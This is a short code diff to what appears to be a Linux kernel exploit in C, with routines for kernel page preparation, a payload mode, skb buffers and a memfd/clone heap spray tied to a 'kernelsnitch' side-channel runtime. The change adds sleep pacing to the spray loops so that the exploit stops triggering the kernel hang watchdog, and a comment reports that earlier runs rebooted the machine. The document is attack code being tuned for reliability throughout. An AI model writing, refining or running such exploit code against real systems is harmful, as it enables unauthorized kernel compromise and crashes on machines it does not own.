@@ -2976,14 +2976,24 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
 
+  /* fork storm pacing: 1088+ back-to-back clone+memfd spikes the load
+   * average into the hang-detect watchdog within ~1s (three straight
+   * reboots died exactly here: "pipe child ctx prep=1088" as the last
+   * line).  Bleed the burst every 128 children; 50ms per batch adds
+   * ~0.5s total but keeps the instantaneous fork rate under the
+   * threshold that killed the previous rounds. */
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
+    if ((i & 127) == 127)
+      usleep(50000);
   }
 
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
+    if ((i & 63) == 63)
+      usleep(30000);
   }
 
   ks = setup_kernelsnitch_runtime();
